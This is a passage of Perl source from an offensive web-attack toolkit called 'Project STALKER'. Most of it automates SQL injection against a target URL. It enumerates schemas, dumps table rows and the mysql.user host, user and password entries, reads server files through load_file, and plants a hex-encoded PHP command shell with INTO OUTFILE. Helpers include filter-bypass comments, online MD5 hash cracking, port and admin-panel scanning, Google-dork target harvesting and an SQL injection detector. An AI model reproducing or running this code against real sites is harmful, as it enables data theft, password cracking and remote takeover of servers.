"unhex(hex(concat(char(69,82,84,79,82,56,53,52),version(),char(69,82,84,79,82,56,53,52),database(),char(69,82,84,79,82,56,53,52),user(),char(69,82,84,79,82,56,53,52))))";
        $injection = $start . $concat . $end . $pass2;
        $code      = toma($injection);
        if ( $code =~ /ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/g ) {
            print
              "\n[!] DB Version : $1\n[!] DB Name : $2\n[!] user_name : $3\n\n";
            savefile(
                $save . ".txt",
                "\n[!] DB Version : $1\n[!] DB Name : $2\n[!] user_name : $3\n"
            );
        }
        else {
            print "\n[-] Not found any data\n";
        }
    }
}

sub menu_options {

    my $save = partimealmedio( $_[0] );
    print "\n/logs/webs/$save>";
    chomp( my $rta = <stdin> );

    if ( $rta =~ /help/ ) {
        print qq(

Commands :

details
tables 
columns <table> 
dbs 
othertable <db> 
othercolumn <db> <table>          
mysqluser 
dumper <table> <column1> <column2> 
createshell 
readfile 
logs 
exit 

);
    }

    if ( $rta =~ /tables/ ) {
        schematables( $_[0], $_[1], $save );
        &reload;
    }
    elsif ( $rta =~ /columns (.*)/ ) {
        my $tabla = $1;
        schemacolumns( $_[0], $_[1], $save, $tabla );
        &reload;
    }
    elsif ( $rta =~ /dbs/ ) {
        &schemadb( $_[0], $_[1], $save );
        &reload;
    }
    elsif ( $rta =~ /othertable (.*)/ ) {
        my $data = $1;
        &schematablesdb( $_[0], $_[1], $data, $save );
        &reload;
    }
    elsif ( $rta =~ /othercolumn (.*) (.*)/ ) {
        my ( $db, $table ) = ( $1, $2 );
        &schemacolumnsdb( $_[0], $_[1], $db, $table, $save );
        &reload;
    }
    elsif ( $rta =~ /mysqluser/ ) {
        &mysqluser( $_[0], $_[1], $save );
        &reload;
    }
    elsif ( $rta =~ /logs/ ) {
        $t = "logs/webs/$save.txt";
        system("start $t");
        &reload;
    }
    elsif ( $rta =~ /exit/ ) {
        next;
    }

    elsif ( $rta =~ /createshell/ ) {
        print "\n\n[Full Path Discloure] : ";
        chomp( my $path = <STDIN> );
        &into( $_[0], $_[1], $path, $save );
    }
    elsif ( $rta =~ /readfile/ ) {
        loadfile( $_[0], $_[1], $save );
    }
    elsif ( $rta =~ /dumper (.*) (.*) (.*)/ ) {
        my ( $tabla, $col1, $col2 ) = ( $1, $2, $3 );
        &dump( $_[0], $col1, $col2, $tabla, $_[1], $save );
        &reload;
    }
    elsif ( $rta =~ /details/ ) {
        &details( $_[0], $_[1], $save );
        &reload;
    }
    else {
        &reload;
    }
}

sub schematables {
    $real = "1";
    my ( $page, $bypass, $save ) = @_;
    savefile( $save . ".txt", "\n" );
    print "\n";
    my $page1 = $page;
    ( $pass1, $pass2 ) = &bypass( $_[1] );
    savefile( $save . ".txt", "[DB] : default" );
    print "\n[+] Searching tables with schema\n\n";
    $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
    $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
    $code =
      toma( $page1 
          . $pass1 . "from" 
          . $pass1
          . "information_schema.tables"
          . $pass2 );

    if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
        my $resto = $1;
        $total = $resto - 17;
        print "[+] Tables Length :  $total\n\n";
        savefile( $save . ".txt", "[+] Searching tables with schema\n" );
        savefile( $save . ".txt", "[+] Tables Length :  $total\n" );
        my $limit = $1;
        for my $limit ( 17 .. $limit ) {
            $code1 =
              toma( $page 
                  . $pass1 . "from" 
                  . $pass1
                  . "information_schema.tables"
                  . $pass1 . "limit"
                  . $pass1
                  . $limit . ",1"
                  . $pass2 );
            if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                my $table = $1;
                chomp $table;
                print "[Table $real Found : $table ]\n";
                savefile( $save . ".txt", "[Table $real Found : $table ]" );
                $real++;
            }
        }
        print "\n";
    }
    else {
        print "\n[-] information_schema = ERROR\n";
    }
}

sub reload {
    &menu_options( $_[0] );
}

sub schemacolumns {
    my ( $page, $bypass, $save, $table ) = @_;
    my $page3 = $page;
    my $page4 = $page;
    savefile( $save . ".txt", "\n" );
    print "\n";
    ( $pass1, $pass2 ) = &bypass($bypass);
    print "\n[DB] : default\n";
    savefile( $save . ".txt", "[DB] : default" );
    savefile( $save . ".txt", "[Table] : $table\n" );
    $page3 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
    $code3 =
      toma( $page3 
          . $pass1 . "from" 
          . $pass1
          . "information_schema.columns"
          . $pass1 . "where"
          . $pass1
          . "table_name=char("
          . ascii($table) . ")"
          . $pass2 );

    if ( $code3 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
        print "\n[Columns Length : $1 ]\n\n";
        savefile( $save . ".txt", "[Columns Length : $1 ]\n" );
        my $si = $1;
        chomp $si;
        $page4 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $real = "1";
        for my $limit2 ( 0 .. $si ) {
            $code4 =
              toma( $page4 
                  . $pass1 . "from" 
                  . $pass1
                  . "information_schema.columns"
                  . $pass1 . "where"
                  . $pass1
                  . "table_name=char("
                  . ascii($table) . ")"
                  . $pass1 . "limit"
                  . $pass1
                  . $limit2 . ",1"
                  . $pass2 );
            if ( $code4 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                print "[Column $real] : $1\n";
                savefile( $save . ".txt", "[Column $real] : $1" );
                $real++;
            }
        }
        print "\n";
    }
    else {
        print "\n[-] information_schema = ERROR\n";
    }
}

sub schemadb {
    my ( $page, $bypass, $save ) = @_;
    my $page1 = $page;
    savefile( $save . ".txt", "\n" );
    print "\n\n[+] Searching DBS\n\n";
    ( $pass1, $pass2 ) = &bypass($bypass);
    $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
    $code =
      toma( $page . $pass1 . "from" . $pass1 . "information_schema.schemata" );
    if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
        my $limita = $1;
        print "[+] Databases Length : $limita\n\n";
        savefile( $save . ".txt", "[+] Databases Length : $limita\n" );
        $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),schema_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $real = "1";
        for my $limit ( 0 .. $limita ) {
            $code =
              toma( $page1 
                  . $pass1 . "from" 
                  . $pass1
                  . "information_schema.schemata"
                  . $pass1 . "limit"
                  . $pass1
                  . $limit . ",1"
                  . $pass2 );
            if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                my $control = $1;
                if (    $control ne "information_schema"
                    and $control ne "mysql"
                    and $control ne "phpmyadmin" )
                {
                    print "[Database $real Found] $control\n";
                    savefile( $save . ".txt",
                        "[Database $real Found] : $control" );
                    $real++;
                }
            }
        }
        print "\n";
    }
    else {
        print "[-] information_schema = ERROR\n";
    }
}

sub schematablesdb {
    my $page  = $_[0];
    my $db    = $_[2];
    my $page1 = $page;
    savefile( $_[3] . ".txt", "\n" );
    print "\n\n[+] Searching tables with DB $db\n\n";
    ( $pass1, $pass2 ) = &bypass( $_[1] );
    savefile( $_[3] . ".txt", "[DB] : $db" );
    $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
    $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
    $code =
      toma( $page1 
          . $pass1 . "from" 
          . $pass1
          . "information_schema.tables"
          . $pass1 . "where"
          . $pass1
          . "table_schema=char("
          . ascii($db) . ")"
          . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass2."\n";
    if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
        print "[+] Tables Length :  $1\n\n";
        savefile( $_[3] . ".txt", "[+] Tables Length :  $1\n" );
        my $limit = $1;
        $real = "1";
        for my $lim ( 0 .. $limit ) {
            $code1 =
              toma( $page 
                  . $pass1 . "from" 
                  . $pass1
                  . "information_schema.tables"
                  . $pass1 . "where"
                  . $pass1
                  . "table_schema=char("
                  . ascii($db) . ")"
                  . $pass1 . "limit"
                  . $pass1
                  . $lim . ",1"
                  . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass1."limit".$pass1.$lim.",1".$pass2."\n";
            if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                my $table = $1;
                chomp $table;
                savefile( $_[3] . ".txt", "[Table $real Found : $table ]" );
                print "[Table $real Found : $table ]\n";
                $real++;
            }
        }
        print "\n";
    }
    else {
        print "\n[-] information_schema = ERROR\n";
    }
}

sub schemacolumnsdb {
    my ( $page, $bypass, $db, $table, $save ) = @_;
    my $page3 = $page;
    my $page4 = $page;
    print "\n\n[+] Searching columns in table $table with DB $db\n\n";
    savefile( $save . ".txt", "\n" );
    ( $pass1, $pass2 ) = &bypass( $_[1] );
    savefile( $save . ".txt", "\n[DB] : $db" );
    savefile( $save . ".txt", "[Table] : $table" );
    $page3 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
    $code3 =
      toma( $page3 
          . $pass1 . "from" 
          . $pass1
          . "information_schema.columns"
          . $pass1 . "where"
          . $pass1
          . "table_name=char("
          . ascii($table) . ")"
          . $pass1 . "and"
          . $pass1
          . "table_schema=char("
          . ascii($db) . ")"
          . $pass2 );

    if ( $code3 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
        print "\n[Columns length : $1 ]\n\n";
        savefile( $save . ".txt", "[Columns length : $1 ]\n" );
        my $si = $1;
        chomp $si;
        $page4 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $real = "1";
        for my $limit2 ( 0 .. $si ) {
            $code4 =
              toma( $page4 
                  . $pass1 . "from" 
                  . $pass1
                  . "information_schema.columns"
                  . $pass1 . "where"
                  . $pass1
                  . "table_name=char("
                  . ascii($table) . ")"
                  . $pass1 . "and"
                  . $pass1
                  . "table_schema=char("
                  . ascii($db) . ")"
                  . $pass1 . "limit"
                  . $pass1
                  . $limit2 . ",1"
                  . $pass2 );
            if ( $code4 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                print "[Column $real] : $1\n";
                savefile( $save . ".txt", "[Column $real] : $1" );
                $real++;
            }
        }
    }
    else {
        print "\n[-] information_schema = ERROR\n";
    }
    print "\n";
}

sub mysqluser {
    my ( $page, $bypass, $save ) = @_;
    my $cop  = $page;
    my $cop1 = $page;
    savefile( $save . ".txt", "\n" );
    print "\n\n[+] Finding mysql.users\n";
    ( $pass1, $pass2 ) = &bypass($bypass);
    $page =~ s/hackman/concat(char(82,65,84,83,88,80,68,79,87,78,49))/;
    $code = toma( $page . $pass1 . "from" . $pass1 . "mysql.user" . $pass2 );

    if ( $code =~ /RATSXPDOWN/ig ) {
        $cop1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code1 =
          toma( $cop1 . $pass1 . "from" . $pass1 . "mysql.user" . $pass2 );
        if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            print "\n[+] Users Found : $1\n\n";
            savefile( $save . ".txt", "\n[+] Users mysql Found : $1\n" );
            for my $limit ( 0 .. $1 ) {
                $cop =~
s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,User,0x524154535850444f574e,Password,0x524154535850444f574e)))/;
                $code =
                  toma( $cop 
                      . $pass1 . "from" 
                      . $pass1
                      . "mysql.user"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit . ",1"
                      . $pass2 );
                if ( $code =~
                    /RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/ig )
                {
                    print "[Host] : $1 [User] : $2 [Password] : $3\n";
                    savefile( $save . ".txt",
                        "[Host] : $1 [User] : $2 [Password] : $3" );
                }
                else {
                    print "\n";
                    &reload;
                }
            }
        }
    }
    else {
        print "\n[-] mysql.user = ERROR\n\n";
    }
}

sub dump {
    savefile( $_[5] . ".txt", "\n" );
    my $page = $_[0];
    ( $pass1, $pass2 ) = &bypass( $_[4] );
    if ( $page =~ /(.*)hackman(.*)/ ) {
        my $start = $1;
        my $end   = $2;
        print "\n\n[+] Extracting values...\n\n";
        $concatx =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),count($_[1]),char(69,82,84,79,82,56,53,52))))";
        $val_code =
          toma( $start 
              . $concatx 
              . $end 
              . $pass1 . "from" 
              . $pass1
              . $_[3]
              . $pass2 );
        $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),$_[1],char(69,82,84,79,82,56,53,52),$_[2],char(69,82,84,79,82,56,53,52))))";
        if ( $val_code =~ /ERTOR854(.*)ERTOR854/ig ) {
            $tota = $1;
            print "[+] Table : $_[3]\n";
            print "[+] Length of the rows : $tota\n\n";
            print "[$_[1]] [$_[2]]\n\n";
            savefile( $_[5] . ".txt", "[Table] : $_[3]" );
            savefile( $_[5] . ".txt", "[+] Length of the rows: $tota\n" );
            savefile( $_[5] . ".txt", "[$_[1]] [$_[2]]\n" );
            for my $limit ( 0 .. $tota ) {
                chomp $limit;
                $injection =
                  toma( $start 
                      . $concat 
                      . $end 
                      . $pass1 . "from" 
                      . $pass1
                      . $_[3]
                      . $pass1 . "limit"
                      . $pass1
                      . $limit . ",1"
                      . $pass2 );
                if ( $injection =~ /ERTOR854(.*)ERTOR854(.*)ERTOR854/ig ) {
                    savefile( $_[5] . ".txt", "[$_[1]] : $1   [$_[2]] : $2" );
                    print "[$_[1]] : $1   [$_[2]] : $2\n";
                }
                else {
                    print "\n\n[+] Extracting Finish\n\n";
                    last;
                    &reload;
                }
            }
        }
        else {
            print "[-] Not Found any DATA\n\n";
        }
    }
}

sub loadfile {
    savefile( $_[2] . ".txt", "\n" );
    ( $pass1, $pass2 ) = &bypass( $_[1] );
    if ( $_[0] =~ /(.*)hackman(.*)/g ) {
        my $start = $1;
        my $end   = $2;
        print "\n\n[+] File to read : ";
        chomp( my $file = <stdin> );
        $concat =
            "unhex(hex(concat(char(107,48,98,114,97),load_file("
          . encode($file)
          . "),char(107,48,98,114,97))))";
        my $code = toma( $start . $concat . $end . $pass2 );
        chomp $code;
        if ( $code =~ /k0bra(.*)k0bra/s ) {
            print "[File Found] : $file\n";
            print "\n[Source Start]\n\n";
            print $1;
            print "\n\n[Source End]\n\n";
            savefile( $_[2] . ".txt", "[File Found] : $file" );
            savefile( $_[2] . ".txt", "\n[Source Start]\n" );
            savefile( $_[2] . ".txt", "$1" );
            savefile( $_[2] . ".txt", "\n[Source End]\n" );
        }
    }
    &reload;
}

sub into {
    print "\n\n[Status] : Injecting a SQLI for create a shell\n\n";
    my ( $page, $bypass, $dir, $save ) = @_;
    savefile( $save . ".txt", "\n" );
    print "\n";
    ( $pass1, $pass2 ) = &bypass($bypass);
    my ( $scheme, $auth, $path, $query, $frag ) = uri_split($page);
    if ( $path =~ /\/(.*)$/ ) {
        my $path1 = $1;
        my $path2 = $path1;
        $path2 =~ s/$1//;
        $dir   =~ s/$path1//ig;
        $shell = $dir . "/" . "shell.php";
        if ( $page =~ /(.*)hackman(.*)/ig ) {
            my ( $start, $end ) = ( $1, $2 );
            $code =
              toma( $start
                  . "0x3c7469746c653e4d696e69205368656c6c20427920446f6464793c2f7469746c653e3c3f7068702069662028697373657428245f4745545b27636d64275d2929207b2073797374656d28245f4745545b27636d64275d293b7d3f3e"
                  . $end
                  . $pass1 . "into"
                  . $pass1
                  . "outfile"
                  . $pass1 . "'"
                  . $shell . "'"
                  . $pass2 );
            $code1 =
              toma( "http://" . $auth . "/" . $path2 . "/" . "shell.php" );
            if ( $code1 =~ /Mini Shell By Doddy/ig ) {
                print "[shell up] : http://" . $auth . "/" . $path2 . "/"
                  . "shell.php\a";
                savefile(
                    $save . ".txt",
                    "[shell up] : http://" 
                      . $auth . "/" 
                      . $path2 . "/"
                      . "shell.php"
                );
            }
            else {
                print "[shell] : Not Found\n";
            }
        }
    }
    print "\n\n";
    &reload;
}

sub bypass {
    if    ( $_[0] eq "/*" )  { return ( "/**/", "/*" ); }
    elsif ( $_[0] eq "%20" ) { return ( "%20",  "%00" ); }
    else                     { return ( "+",    "--" ); }
}

sub ascii {
    return join ',', unpack "U*", $_[0];
}

sub base {
    $re = encode_base64( $_[0] );
    chomp $re;
    return $re;
}

sub base_de {
    $re = decode_base64( $_[0] );
    chomp $re;
    return $re;
}

sub download {
    if ( $nave->mirror( $_[0], $_[1] ) ) {
        if ( -f $_[1] ) {
            return true;
        }
    }
}

sub hex_en {
    my $string = $_[0];
    $hex = '0x';
    for ( split //, $string ) {
        $hex .= sprintf "%x", ord;
    }
    return $hex;
}

sub hex_de {
    my $text = shift;
    $text =~ s/^0x//;
    $encode = join q[], map { chr hex } $text =~ /../g;
    return $encode;
}

sub ascii_de {
    my $text = shift;
    $text = join q[], map { chr } split q[,], $text;
    return $text;
}

sub getprocess {

    my %procesos;

    my $uno = Win32::OLE->new("WbemScripting.SWbemLocator");
    my $dos = $uno->ConnectServer( "", "root\\cimv2" );

    foreach my $pro ( in $dos->InstancesOf("Win32_Process") ) {
        $procesos{ $pro->{Caption} } = $pro->{ProcessId};
    }
    return %procesos;
}

sub killprocess {

    my $pid = shift;

    if ( Win32::Process::KillProcess( $pid, "" ) ) {
        return true;
    }
    else {
        return false;
    }
}

sub getip {
    my $get = gethostbyname( $_[0] );
    return inet_ntoa($get);
}

sub ftp {

    my ( $ftp, $user, $pass ) = @_;

    if ( my $socket = Net::FTP->new($ftp) ) {
        if ( $socket->login( $user, $pass ) ) {

            print "\n[+] Enter of the server FTP\n\n";

          menu:

            print "\n\nftp>";
            chomp( my $cmd = <stdin> );
            print "\n\n";

            if ( $cmd =~ /help/ ) {
                print q(

help : show information
cd : change directory <dir>
dir : list a directory 
mdkdir : create a directory <dir>
rmdir : delete a directory <dir>
pwd : directory  
del : delete a file <file>
rename : change name of the a file <file1> <file2>
size : size of the a file <file>
put : upload a file <file>
get : download a file <file>
cdup : change dir <dir>
exit : ??


);
            }

            if ( $cmd =~ /dir/ig ) {
                if ( my @files = $socket->dir() ) {
                    for (@files) {
                        print "[+] " . $_ . "\n";
                    }
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /pwd/ig ) {
                print "[+] Path : " . $socket->pwd() . "\n";
            }

            if ( $cmd =~ /cd (.*)/ig ) {
                if ( $socket->cwd($1) ) {
                    print "[+] Directory changed\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /cdup/ig ) {
                if ( my $dir = $socket->cdup() ) {
                    print "\n\n[+] Directory changed\n\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /del (.*)/ig ) {
                if ( $socket->delete($1) ) {
                    print "[+] File deleted\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /rename (.*) (.*)/ig ) {
                if ( $socket->rename( $1, $2 ) ) {
                    print "[+] File Updated\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /mkdir (.*)/ig ) {
                if ( $socket->mkdir($1) ) {
                    print "\n\n[+] Directory created\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /rmdir (.*)/ig ) {
                if ( $socket->rmdir($1) ) {
                    print "\n\n[+] Directory deleted\n";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /exit/ig ) {
                next;
            }

            if ( $cmd =~ /get (.*) (.*)/ig ) {
                print "\n\n[+] Downloading file\n\n";
                if ( $socket->get( $1, $2 ) ) {
                    print "[+] Download completed";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /put (.*) (.*)/ig ) {
                print "\n\n[+] Uploading file\n\n";
                if ( $socket->put( $1, $2 ) ) {
                    print "[+] Upload completed";
                }
                else {
                    print "\n\n[-] Error\n\n";
                }
            }

            if ( $cmd =~ /quit/ ) {
                next;
            }

            goto menu;

        }
        else {
            print "\n[-] Failed the login\n\n";
        }

    }
    else {
        print "\n\n[-] Error\n\n";
    }

}

sub crackit {

    my $target = shift;

    chomp $target;

    my %hash = (

        'http://md5.hashcracking.com/search.php?md5=' => {
            'tipo'  => 'get',
            'regex' => "Cleartext of $target is (.*)",
        },

        'http://www.hashchecker.com/index.php?_sls=search_hash' => {
            'variables' => { 'search_field' => $target, 'Submit' => 'search' },
            'regex' =>
              "<td><li>Your md5 hash is :<br><li>$target is <b>(.*)<\/b>",
        },

        'http://md5.rednoize.com/?q=' => {
            'tipo'  => 'get',
            'regex' => "<div id=\"result\" >(.*)<\/div>"
        },

        'http://md52.altervista.org/index.php?md5=' => {
            'tipo'  => 'get',
            'regex' => "<br>Password: <font color=\"Red\">(.*)<\/font><\/b>"
          }

    );

    for my $data ( keys %hash ) {
        if ( $hash{$data}{tipo} eq "get" ) {
            $code = toma( $data . $target );
            if ( $code =~ /$hash{$data}{regex}/ig ) {
                my $found = $1;
                unless ( $found =~ /\[Non Trovata\]/ ) {
                    return $found;
                    last;
                }
            }
        }
        else {
            $code = tomar( $data, $hash{$data}{variables} );
            if ( $code =~ /$hash{$data}{regex}/ig ) {
                my $found = $1;
                return $found;
                last;
            }
        }
    }
    return "false01";
}

sub ver_length {
    return true if length( $_[0] ) == 32;
}

sub scanpaths {

    my $urla = $_[0];

    print "\n[+] Find paths in $urla\n\n\n";
    my @urls = repes( get_links( toma($urla) ) );
    for $url (@urls) {
        my $web = $url;
        my ( $scheme, $auth, $path, $query, $frag ) = uri_split($url);
        if ( $_[0] =~ /$auth/ or $auth eq "" ) {
            if ( $path =~ /(.*)\/(.*)\.(.*)$/ ) {
                my $borrar = $2 . "." . $3;
                if ( $web =~ /(.*)$borrar/ ) {
                    my $co = $1;
                    unless ( $co =~ /$auth/ ) {
                        $co = $urla . $co;
                    }
                    $code = toma($co);
                    if ( $code =~ /Index Of/ig ) {
                        print "[Link] : " . $co . "\n";
                        saveyes( "logs/paths-found.txt", $co );
                    }
                }
            }
        }
    }
}

sub scanport {

    my %ports = (
        "21"   => "ftp",
        "22"   => "ssh",
        "25"   => "smtp",
        "80"   => "http",
        "110"  => "pop3",
        "3306" => "mysql"
    );

    print "[+] Scanning $_[0]\n\n\n";

    for my $port ( keys %ports ) {

        if (
            new IO::Socket::INET(
                PeerAddr => $_[0],
                PeerPort => $port,
                Proto    => "tcp",
                Timeout  => 0.5
            )
          )
        {
            print "[Port] : " . $port . " [Service] : " . $ports{$port} . "\n";
        }
    }
    print "\n\n[+] Finish\n";
}

sub scanpanel {
    print "[+] Scanning $_[0]\n\n\n";
    for $path (@panels) {
        $code = tomax( $_[0] . "/" . $path );
        if ( $code->is_success ) {
            print "[Link] : " . $_[0] . "/" . $path . "\n";
            saveyes( "logs/panel-logs.txt", $_[0] . "/" . $path );
        }
    }
    print "\n\n[+] Finish\n";
}

sub google {
    my ( $a, $b ) = @_;
    my @founds;
    for ( $pages = 10 ; $pages <= $b ; $pages = $pages + 10 ) {
        $code = toma(
            "http://www.google.com.ar/search?hl=&q=" . $a . "&start=$pages" );
        while ( $code =~ /(?<="r"><. href=")(.+?)"/mig ) {
            my $url = $1;
            if ( $url =~ /\/url\?q\=(.*?)\&amp\;/ ) {
                push( @founds, uri_unescape($1) );
            }
        }
    }
    my @founds = repes( cortar(@founds) );
    return @founds;
}

sub sql {

    my ( $pass1, $pass2 ) = ( "+", "--" );
    my $page = shift;
    $code1 =
      toma( $page . "-1" 
          . $pass1 . "union" 
          . $pass1 
          . "select" 
          . $pass1 . "666"
          . $pass2 );
    if ( $code1 =~
        /The used SELECT statements have a different number of columns/ig )
    {
        print "[+] SQLI : $page\a\n";
        saveyes( "logs/sql-logs.txt", $page );
    }
}

sub get_links {

    $test = HTML::LinkExtor->new( \&agarrar )->parse( $_[0] );
    return @links;

    sub agarrar {
        my ( $a, %b ) = @_;
        push( @links, values %b );
    }
}

sub repes {
    my @limpio;
    foreach $test (@_) {
        push @limpio, $test unless $repe{$test}++;
    }
    return @limpio;
}

sub cortar {
    my @nuevo;
    for (@_) {
        if ( $_ =~ /=/ ) {
            @tengo = split( "=", $_ );
            push( @nuevo, @tengo[0] . "=" );
        }
        else {
            push( @nuevo, $_ );
        }
    }
    return @nuevo;
}

sub head {
    cprint "\x0311";    #13
    print "\n\n-- == Project STALKER == --\n\n";
    cprint "\x030";
}

sub copyright {
    cprint "\x0311";    #13
    print "\n\n(C) Doddy Hackman 2012\n\n";
    cprint "\x030";
}

sub toma {
    return $nave->get( $_[0] )->content;
}

sub tomax {
    return $nave->get( $_[0] );
}

sub tomar {
    my ( $web, $var ) = @_;
    return $nave->post( $web, [ %{$var} ] )->content;
}

sub conectar {

    my $sockex = new IO::Socket::INET(
        PeerAddr => $_[0],
        PeerPort => $_[1],
        Proto    => "tcp",
        Timeout  => 5
    );

    print $sockex $_[2] . "\r\n";
    $sockex->read( $re, 5000 );
    $sockex->close;
    return $re . "\r\n";
}

sub enter {

    my ( $host, $user, $pass ) = @_;

    print "[+] Connecting to the server\n";

    $info = "dbi:mysql::" . $host . ":3306";
    if ( my $enter = DBI->connect( $info, $user, $pass, { PrintError => 0 } ) )
    {

        print "\n[+] Enter in the database";

        while (1) {
            print "\n\n\n[+] Query : ";
            chomp( my $ac = <stdin> );

            if ( $ac eq "exit" ) {
                $enter->disconnect;
                print "\n\n[+] Closing connection\n\n";
                last;
            }

            $re = $enter->prepare($ac);
            $re->execute();
            my $total = $re->rows();

            my @columnas = @{ $re->{NAME} };

            if ( $total eq "-1" ) {
                print "\n\n[-] Query Error\n";
                next;
            }
            else {
                print "\n\n[+] Result of the query\n";
                if ( $total eq 0 ) {
                    print "\n\n[+] Not rows returned\n\n";
                }
                else {
                    print "\n\n[+] Rows returned : " . $total . "\n\n\n";
                    for (@columnas) {
                        print $_. "\t\t";
                    }
                    print "\n\n";
                    while ( @row = $re->fetchrow_array ) {
                        for (@row) {
                            print $_. "\t\t";
                        }
                        print "\n";
                    }
                }
            }
        }
    }
    else {
        print "\n[-] Error connecting\n";
    }
}

sub encode {
    my $string = $_[0];
    $hex = '0x';
    for ( split //, $string ) {
        $hex .= sprintf "%x", ord;
    }
    return $hex;
}

sub saveyes {
    open( SAVE, ">>" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub savefile {
    open( SAVE, ">>logs/webs/" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub coleccionar {
    opendir DIR, $_[0];
    my @archivos = readdir DIR;
    close DIR;
    return @archivos;
}

sub infocon {
    my $target = shift;

    my $get    = gethostbyname($target);
    my $target = inet_ntoa($get);

    print "[+] Getting info\n\n\n";
    $total =
      "http://www.melissadata.com/lookups/iplocation.asp?ipaddress=$target";
    $re = toma($total);

    if ( $re =~ /City<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
        print "[+] City : $2\n";
    }
    else {
        print "[-] Not Found\n";
        copyright();
    }
    if ( $re =~ /Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
        print "[+] Country : $2\n";
    }
    if ( $re =~ /State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
        print "[+] State or Region : $2\n";
    }

    print "\n\n[+] Getting Hosts\n\n\n";

    my $code = toma( "http://www.ip-adress.com/reverse_ip/" . $target );

    while ( $code =~ /whois\/(.*?)\">Whois/g ) {
        my $dns = $1;
        chomp $dns;
        print "[DNS] : $dns\n";
    }
}

sub whois {

    my $ob   = shift;
    my $code = tomar(
        "http://networking.ringofsaturn.com/Tools/whois.php",
        { "domain" => $ob, "submit" => "submit" }
    );

    my @chau = ( "&quot;", "&gt;&gt;&gt;", "&lt;&lt;&lt;" );

    if ( $code =~ /<pre>(.*?)<\/pre>/sig ) {
        my $resul = $1;
        chomp $resul;

        for my $cha (@chau) {
            $resul =~ s/$cha//ig;
        }

        if ( $resul =~ /Whois Server Version/ ) {
            return $resul;
        }
        else {
            return "Not Found";
        }
    }
}

sub partimealmedio {
    my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
    my $save = $auth;
    $save =~ s/:/_/;
    return $save;
}

sub helpme {

    cprint "\x035";
    print qq(
This program was coded By Doddy Hackman in the year 2012

[+] Commands : 

[++] cmd_getinfo [Windows Only]
[++] cmd_getip <host>
[++] cmd_getlink <page>
[++] cmd_getprocess [Windows Only]
[++] cmd_killprocess <pid process> [Windows Only]
[++] cmd_conec <host> <port> <command>  
[++] cmd_allow <host>
[++] cmd_paths <page>
[++] cmd_encodehex <text>
[++] cmd_decodehex <text>
[++] cmd_encodeascii <text>
[++] cmd_decodeascii <text>
[++] cmd_encodebase <text>
[++] cmd_decodebase <text>
[++] cmd_scanport <host>
[++] cmd_panel <page>
